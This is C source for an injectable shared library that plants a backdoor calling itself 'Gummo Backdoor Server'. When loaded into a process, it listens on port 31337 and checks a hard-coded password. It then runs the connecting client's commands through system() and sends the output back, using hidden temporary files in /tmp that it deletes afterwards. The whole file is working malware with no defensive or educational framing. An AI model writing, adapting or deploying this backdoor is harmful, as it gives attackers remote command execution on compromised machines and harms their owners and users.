#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define PORT 31337
#define BACKLOG 5
#define CMD_LOG "/tmp/.cmd"
#define PASSWORD "password"
/*
 * hello()
 *
 * Hello world function exported by the sample library.
 *
 */

void hello() { printf("I just got loaded\n"); }

/*
 * loadMsg()
 *
 * This function is automatically called when the sample library is injected
 * into a process. It calls hello() to output a message indicating that the
 * library has been loaded.
 *
 */

__attribute__((constructor)) void loadMsg() { hello(); }

/* global */
void parasite_run_test() { printf("Into parasite_run_\n"); } /* command() will process all the commands sent */
/* and send back the output of them to your client */
int newfd;

void command();
void parasite_run_()
{
    printf("Into parasite_run_\n");

    int sockfd, sin_size, ss, len, bytes;

    struct sockaddr_in my_addr;
    struct sockaddr_in their_addr;

    char passwd[1024];
    char *prompt = "Password: ";
    char *gp;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(PORT);
    my_addr.sin_addr.s_addr = INADDR_ANY;
    bzero(&(my_addr.sin_zero), 8);

    if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) {
        perror("bind");
        exit(1);
    }
    if (listen(sockfd, BACKLOG) == -1) {
        perror("listen");
        exit(1);
    }
    while (1) {
        ss = sizeof(struct sockaddr_in);
        if ((newfd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) {
            perror("accept");
            exit(1);
        }

        switch (fork()) {
        case -1:
            printf("parasite_run_ fork fail\n");
            close(newfd);
            break;
        case 0:
            printf("parasite_run_ fork child continue\n");
            
            len = strlen(prompt);
            bytes = send(newfd, prompt, len, 0);
            recv(newfd, passwd, 1024, 0);
            if ((gp = strchr(passwd, 10)) != NULL) *(gp) = '\0';
            if ((gp = strchr(passwd, 13)) != NULL) *(gp) = '\0';

            if (!strcmp(passwd, PASSWORD)) {
                send(newfd, "Access Granted, HEH\n", 21, 0);
                send(newfd, "\n\n\n\n\n\nWelcome To Gummo Backdoor Server!\n\n", 41, 0);
                send(newfd, "Type 'HELP' for a list of commands\n\n", 36, 0);
                command();
            } else if (passwd != PASSWORD) {
                send(newfd, "Authentification Failed! =/\n", 29, 0);
                close(newfd);
            }
            exit(0);
            break;
        default:
            printf("parasite_run_ fork parent continue\n");

             printf("parasite_run_ fork parent continue _out default\n");
        }
        /*
          if (fork ())
        {
          len = strlen (prompt);
          bytes = send (newfd, prompt, len, 0);
          recv (newfd, passwd, 1024, 0);

          if ((gp = strchr (passwd, 13)) != NULL)
            *(gp) = '\0';

          if (!strcmp (passwd, PASSWORD))
            {
              send (newfd, "Access Granted, HEH\n", 21, 0);
              send (newfd, "\n\n\n\n\n\nWelcome To Gummo Backdoor Server!\n\n", 41, 0);
              send (newfd, "Type 'HELP' for a list of commands\n\n", 36, 0);
              command ();
            }
          else if (passwd != PASSWORD)
            {
              send (newfd, "Authentification Failed! =/\n", 29, 0);
              close (newfd);
            }
        }*/
    }
} /* command() will process all the commands sent */
/* and send back the output of them to your client */

void command()
{
    FILE *read;
    FILE *append;
    char cmd_dat[1024];
    char cmd_relay[1024];
    char clean_log[1024];
    char buf[5000];
    char filename[256];

    int dxm;

    while (1) {
        memset(cmd_dat, 0, 1024);
        memset(cmd_relay, 0, 1024);
        memset(clean_log, 0, 1024);
        memset(filename, 0, 256);
        srand(time(NULL));

        // 生成一个0到9999999999（10位内的最大整数）之间的随机数
        int random_number = rand() % 1000000000;
        snprintf(filename, 255, "%s%x", CMD_LOG, random_number);
        printf("filename:%s\n", filename);
        send(newfd, "command:~# ", 11, 0);
        recv(newfd, cmd_dat, 1024, 0);
        cmd_dat[1023] = '\0';
        if (strcmp(cmd_dat, "")) {
            //	  clean_log = (char *) malloc (420);
            //	  sprintf (clean_log, "rm %s", CMD_LOG);
            //	  system (clean_log);

            //	  cmd_relay = (char *) malloc (1024);

            char *gp;
            if ((gp = strchr(cmd_dat, 10)) != NULL) *(gp) = '\0';
            if ((gp = strchr(cmd_dat, 13)) != NULL) *(gp) = '\0';
            if (strcmp(cmd_dat, "quit") == 0) {
                printf("quit:\n");
                close(newfd);
                exit(0);
            }
            snprintf(cmd_relay, 1024, "%s > %s;\0", cmd_dat, filename);
            printf("cmd_relay:%s\n", cmd_relay);
            system(cmd_relay);

            if ((read = fopen(filename, "r")) == NULL) continue;
            while (!(feof(read))) {
                memset(buf, 0, 500);
                fgets(buf, 500, read);
                if (buf[0] == 0) break;
                write(newfd, buf, 500);
            }
            fclose(read);
            sprintf(clean_log, "rm %s", filename);
            printf("clean_log:%s\n", clean_log);
            system(clean_log);
        }
    }
}
